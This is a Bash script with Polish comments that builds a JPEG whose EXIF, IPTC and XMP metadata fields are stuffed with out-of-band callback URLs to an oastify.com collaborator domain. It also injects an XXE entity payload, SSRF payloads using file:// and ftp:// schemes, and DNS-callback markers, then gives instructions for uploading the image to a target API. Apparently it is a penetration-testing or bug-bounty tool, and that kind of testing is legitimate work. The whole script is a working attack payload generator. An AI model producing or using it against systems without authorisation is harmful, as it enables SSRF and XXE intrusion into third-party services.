#!/bin/bash

# Ustawienia
OASTIFY="r3vjn6tbu29ak2hgdjthl0cez55wtoqcf.oastify.com"
OUTPUT_FILE="payload_image.jpg"

echo "[*] Generowanie obrazka z OOB payloadami w metadanych..."
echo "[*] Oastify domain: ${OASTIFY}"

# Tworzenie prostego obrazka 100x100 (czerwony kwadrat)
convert -size 100x100 xc:red temp_base.jpg 2>/dev/null || {
    echo "[!] ImageMagick nie zainstalowany. Instaluję..."
    sudo apt-get update && sudo apt-get install -y imagemagick
    convert -size 100x100 xc:red temp_base.jpg
}

# Sprawdzenie czy exiftool jest zainstalowany
if ! command -v exiftool &> /dev/null; then
    echo "[!] exiftool nie zainstalowany. Instaluję..."
    sudo apt-get update && sudo apt-get install -y libimage-exiftool-perl
fi

echo "[*] Wstrzykiwanie payloadów OOB do metadanych..."

# Payloady OOB - różne protokoły i metody
exiftool -overwrite_original \
    -Artist="http://${OASTIFY}/exif-artist" \
    -Copyright="https://${OASTIFY}/exif-copyright" \
    -ImageDescription="http://${OASTIFY}/exif-description" \
    -Make="http://${OASTIFY}/exif-make" \
    -Model="http://${OASTIFY}/exif-model" \
    -Software="http://${OASTIFY}/exif-software" \
    -XPTitle="http://${OASTIFY}/exif-xptitle" \
    -XPComment="http://${OASTIFY}/exif-xpcomment" \
    -XPAuthor="http://${OASTIFY}/exif-xpauthor" \
    -XPKeywords="http://${OASTIFY}/exif-xpkeywords" \
    -XPSubject="http://${OASTIFY}/exif-xpsubject" \
    -Comment="http://${OASTIFY}/exif-comment" \
    -UserComment="http://${OASTIFY}/exif-usercomment" \
    -DocumentName="http://${OASTIFY}/exif-documentname" \
    -HostComputer="http://${OASTIFY}/exif-hostcomputer" \
    -OwnerName="http://${OASTIFY}/exif-ownername" \
    -Creator="http://${OASTIFY}/iptc-creator" \
    -Credit="http://${OASTIFY}/iptc-credit" \
    -Source="http://${OASTIFY}/iptc-source" \
    -CaptionAbstract="http://${OASTIFY}/iptc-caption" \
    -Headline="http://${OASTIFY}/iptc-headline" \
    -Instructions="http://${OASTIFY}/iptc-instructions" \
    -Title="http://${OASTIFY}/xmp-title" \
    -Description="http://${OASTIFY}/xmp-description" \
    -Subject="http://${OASTIFY}/xmp-subject" \
    -Creator="http://${OASTIFY}/xmp-creator" \
    -Rights="http://${OASTIFY}/xmp-rights" \
    temp_base.jpg

# Dodatkowe payloady XMP (wstrzykiwanie surowego XML)
exiftool -overwrite_original \
    -xmp:Label="http://${OASTIFY}/xmp-label" \
    -xmp:Rating="http://${OASTIFY}/xmp-rating" \
    temp_base.jpg

# DNS exfiltration payloady (subdomena jako znacznik)
exiftool -overwrite_original \
    -GPSLatitude="dns-lat.${OASTIFY}" \
    -GPSLongitude="dns-long.${OASTIFY}" \
    temp_base.jpg

# XXE payloady dla parserów XML w XMP
XXE_PAYLOAD="<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'http://${OASTIFY}/xxe-test'>]><root>&xxe;</root>"
exiftool -overwrite_original \
    -Comment="${XXE_PAYLOAD}" \
    temp_base.jpg

# SSRF payloady - różne schematy URI
exiftool -overwrite_original \
    -Keywords="file://${OASTIFY}/file-scheme" \
    -DateCreated="ftp://${OASTIFY}/ftp-scheme" \
    temp_base.jpg

# Przeniesienie do finalnego pliku
mv temp_base.jpg "${OUTPUT_FILE}"

echo ""
echo "[✓] Gotowe! Plik: ${OUTPUT_FILE}"
echo ""
echo "[*] Wstrzyknięte payloady OOB:"
echo "    - HTTP/HTTPS callbacks w EXIF (Artist, Copyright, Make, Model, etc.)"
echo "    - IPTC payloady (Creator, Credit, Source, Caption)"
echo "    - XMP payloady (Title, Description, Rights)"
echo "    - DNS exfiltration (GPS coordinates)"
echo "    - XXE payload w Comment"
echo "    - SSRF z różnymi schematami (file://, ftp://)"
echo ""
echo "[*] Sprawdź logi na: https://${OASTIFY}"
echo ""
echo "[*] Podgląd metadanych:"
exiftool "${OUTPUT_FILE}" | grep -i "oastify\|http"
echo ""
echo "[*] Aby przetestować, wyślij ${OUTPUT_FILE} do API:"
echo "    BASE64=\$(base64 -w0 ${OUTPUT_FILE})"
echo "    # Następnie użyj w PUT request z rawData: \"data:image/jpeg;base64,\${BASE64}\""
